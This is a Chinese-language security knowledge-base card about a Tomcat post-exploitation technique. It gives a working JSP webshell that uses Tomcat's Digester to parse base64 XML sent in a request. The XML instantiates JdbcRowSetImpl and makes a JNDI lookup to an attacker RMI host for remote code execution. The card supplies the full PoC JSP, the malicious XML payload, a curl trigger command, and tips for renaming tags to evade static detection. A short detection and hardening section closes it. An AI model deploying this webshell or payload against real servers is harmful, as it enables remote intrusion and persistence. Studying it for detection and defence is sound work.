---
id: web-java-component-tomcat-digester-jsp-runtime-webshell
title: Tomcat Digester 运行时 JSP webshell：自定义规则 + base64 XML 触发 setter JNDI
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-digester-runtime-jsp-webshell
tags:
- java
- tomcat
- digester
- webshell
- jndi
- jdbcrowsetimpl
- xml
- setter
- rce
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V24
  verified_at: '2026-11-05T02:51:51+08:00'
  notes: 已对照原文与48张图核对：img01-11 Catalina.load→Digester→ObjectCreateRule.loadClass/newInstance→SetPropertiesRule→IntrospectionUtils.setProperty（图11 invokeSetProperty=true）；img36-47 构造/简化 JSP webshell；img48 简化版 Test/Loader + base64 XML 弹出计算器。PoC 与 XML 与原文一致；原文未在本机复现验证（Tomcat 8.5.60 实测，9 亦可行），未给受影响版本区间故不设 versions。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-digester-jsp-runtime-webshell/
draft: false
kb_aliases:
- Tomcat XML webshell
- Digester JSP webshell
- addObjectCreate webshell
- base64 XML setter 调用
- Tomcat 无配置文件 webshell
- JdbcRowSetImpl Digester
- Tomcat 解析 XML webshell
---

## 一句话结论

在已能写入/执行 JSP 的前提下，用一个极短 JSP 创建 Tomcat 的 `org.apache.tomcat.util.digester.Digester`，注册自定义标签规则，把请求传入的 base64 XML 直接 `parse`，即可按 `className` 实例化 `JdbcRowSetImpl` 并调用其 `dataSourceName`/`autoCommit` setter，触发 JNDI lookup 执行命令；整个过程不需要向 Tomcat 配置目录写 XML，也不依赖 `ContextConfig`/反射获取 `StandardContext`。

## 原理

- Tomcat 的 Digester 把 XML 标签映射为规则：`ObjectCreateRule` 读取标签的 `className` 属性，`loadClass` 后无参 `newInstance`；`SetPropertiesRule` 遍历其余属性，调用 `IntrospectionUtils.setProperty(instance, name, value)`，后者把属性名转成 `setXxx` 并反射调用对应 setter（支持 String、int、boolean 等参数）。
- 因此 XML 作者可以决定“实例化哪个类、调用哪些 setter”，没有类白名单或 setter 白名单。`com.sun.rowset.JdbcRowSetImpl` 的 `setDataSourceName(String)` 保存 JNDI URL，`setAutoCommit(true)` 在 `autoCommit=true` 时调用 `connect()`，内部执行 `InitialContext.lookup(dataSourceName)`；把 URL 指向攻击者的 LDAP/RMI 服务即可加载远程/本地 gadget 执行命令。
- 关键在 `addObjectCreate`/`addSetProperties` 可以由调用者自行注册：不必像 Tomcat 解析 `context.xml` 那样依赖 `ContextRuleSet`、`NamingRuleSet` 和复杂的 `ContextConfig` 流程。JSP 中直接 `new Digester()`，注册任意标签（如 `Test/Loader`）和属性名（如 `className`），再把输入流传给 `parse(InputStream)` 即可。
- 这样构造的 JSP 不出现 `ContextConfig`、`StandardContext`、`request.getContext()` 等敏感调用，代码量很小；标签名和属性名还能自定义，降低被静态查杀的特征。
- 与“写入 `conf/Catalina/localhost/*.xml` 等 Tomcat 配置目录由热部署解析”的链不同：本方式不要求对 Tomcat 配置目录有写权限，只要有一个可执行 JSP（上传/已有 webshell/文件写入）即可在运行时按请求解析任意 XML。

## 触发条件

- 攻击者已能让 Tomcat 执行一个 JSP（JSP 上传、已有 webshell、文件写入 + 可访问路径）。
- 目标使用 Tomcat（`org.apache.tomcat.util.digester.Digester` 在容器 classpath 中），JSP 允许 scriptlet（未禁用脚本、未只允许 JSPX/预编译）。
- 目标可访问攻击者的 LDAP/RMI 服务，且 JDK 的 JNDI 远程 codebase 未阻断；JDK 8u191+/11.0.1+ 默认 `trustURLCodebase=false`，需要本地 gadget 或其它 JNDI 绕过（本卡不展开）。
- `JdbcRowSetImpl` 在目标 JDK 中可用（JDK 8 常见；高版本模块化后需确认）。

## 利用步骤

1. 准备恶意 XML：根标签任意（如 `Test`），子标签用 `Loader`，`className` 指向 `JdbcRowSetImpl`，`dataSourceName` 在前、`autoCommit="true"` 在后。
2. 在攻击者主机启动 LDAP/RMI 服务，返回可执行的 gadget 或可用本地 gadget。
3. 上传/写入以下 JSP（或把代码嵌入已有 JSP）：创建 Digester、注册 `Test/Loader` 规则、把 base64 解码后的字节流交给 `parse`。
4. 访问 JSP，`cmd` 参数传 XML 的 base64；Tomcat 解析 XML 时实例化 `JdbcRowSetImpl` 并调用 setter，触发 JNDI 回连。
5. 观察 LDAP/RMI 回连与命令执行结果；如失败，检查属性顺序（`dataSourceName` 必须先于 `autoCommit`）与 JDK JNDI 限制。

## PoC

```jsp
<%@ page import="org.apache.tomcat.util.digester.Digester" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.util.Base64" %>
<%
    Digester digester = new Digester();
    // 自定义标签与类名属性，避免出现 ContextConfig/StandardContext 等敏感调用
    digester.addObjectCreate("Test/Loader", null, "className");
    digester.addSetProperties("Test/Loader");
    digester.parse(new ByteArrayInputStream(
        Base64.getDecoder().decode(request.getParameter("cmd"))));
%>
```

```xml
<?xml version='1.0' encoding='utf-8'?>
<Test>
    <Loader className="com.sun.rowset.JdbcRowSetImpl"
            dataSourceName="rmi://192.168.129.1:1099/slq0x1"
            autoCommit="true"/>
</Test>
```

```bash
# 生成 base64 并访问
base64 -w0 payload.xml
curl "http://target/demo.jsp?cmd=<base64>"
```

```text
调用链（节选）：
Digester.startElement("Test/Loader")
  → ObjectCreateRule.begin        # loadClass("com.sun.rowset.JdbcRowSetImpl").newInstance()
  → SetPropertiesRule.begin       # dataSourceName / autoCommit
     → IntrospectionUtils.setProperty
        → JdbcRowSetImpl.setDataSourceName("rmi://...")
        → JdbcRowSetImpl.setAutoCommit(true)
           → connect() → InitialContext.lookup("rmi://...")
```

## 变体与关联

- 变体：自定义标签/属性名（如 `X/Y` + `clazz`）可进一步隐藏特征；只要 `addObjectCreate` 的第三个参数与 XML 属性名一致即可。
- 变体：`JdbcRowSetImpl` 可替换为任何“无参构造 + 危险 setter”的类，例如 setter 内触发 URL 连接、脚本执行、文件写入的类；JNDI 只是最常见的一种。
- 变体：原始长版 JSP 通过 `ContextConfig` + `StandardContext.defaultContextXml` 指定本地 XML，再反射调用 `contextConfig(Digester)`；功能等价但代码更冗长、特征更明显。
- 关联卡片：[[web-java-component-tomcat-xml-digester-setter-jndi]]（同一 Digester setter 机制，但投递方式为写入 Tomcat 配置目录并由热部署解析）；[[web-java-deser-fastjson-jdbc-rowset]]（`JdbcRowSetImpl` 作为 JNDI gadget 的另一入口）；`web/java/deserialization/jndi` 下的高版本 JNDI 绕过卡。
- 边界：JSP 不允许 scriptlet、Tomcat 被裁剪掉 `tomcat-util`/Digester、目标无法访问攻击者 JNDI 服务、JDK 阻断远程 codebase 且无本地 gadget 时，链路失效；`dataSourceName` 与 `autoCommit` 的属性顺序会影响 `connect()` 是否拿到 URL。

## 检测与防御

- 检测：JSP/上传文件中出现 `org.apache.tomcat.util.digester.Digester`、`addObjectCreate`、`addSetProperties`、`parse(` 组合；请求参数为长 base64 且服务端出现 XML 解析行为；XML 中出现 `className`、`dataSourceName`、`autoCommit`、`ldap://`/`rmi://`；Tomcat 进程发起异常 JNDI 外连与类加载。
- 修复：修复 JSP 上传/任意文件写入，上传目录禁止 JSP 解析；对上传内容做类型与内容检测，禁止 `.jsp/.jspx`。
- 加固：生产环境禁用 scriptlet 或只部署预编译 JSP；限制 Tomcat 进程权限与出站 LDAP/RMI；升级 JDK 并关闭 JNDI 远程 codebase，必要时用 `ObjectInputFilter`/SecurityManager 类策略限制危险类；对 Web 目录做文件完整性监控，发现新增 JSP 立即告警。
